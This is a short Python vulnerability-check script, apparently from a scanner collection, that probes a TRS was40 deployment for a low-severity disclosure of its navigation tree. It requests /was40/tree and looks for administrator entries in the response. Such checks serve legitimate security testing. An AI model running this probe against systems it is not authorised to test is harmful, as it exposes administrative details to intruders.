#!/usr/bin/env python
# -*- coding: utf-8 -*-
'''
name: TRS was40 tree导航树泄露
referer: http://www.wooyun.org/bugs/wooyun-2013-038875
author: Ascotbe
reference: Lucifer
description: 访问was40/tree可查看信息导航树。
'''
import sys
import requests
import warnings
from termcolor import cprint

class trs_was40_tree_disclosure_BaseVerify:
    def __init__(self, url):
        self.url = url

    def run(self):
        headers = {
            "User-Agent":"Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_8; en-us) AppleWebKit/534.50 (KHTML, like Gecko) Version/5.1 Safari/534.50"
        }
        payload = "/was40/tree"
        vulnurl = self.url + payload
        try:
            req = requests.get(vulnurl, headers=headers, timeout=10, verify=False)
            if req.status_code == 200 and r"tree?treekind=navigate" in req.text and r"administrator" in req.text:
                cprint("[+]存在TRS was40 tree导航树泄露漏洞...(低危)\tpayload: "+vulnurl, "green")
            else:
                cprint("[-]不存在trs_was40_tree_disclosure漏洞", "white", "on_grey")

        except:
            cprint("[-] "+__file__+"====>可能不存在漏洞", "cyan")

if __name__ == "__main__":
    warnings.filterwarnings("ignore")
    testVuln = trs_was40_tree_disclosure_BaseVerify(sys.argv[1])
    testVuln.run()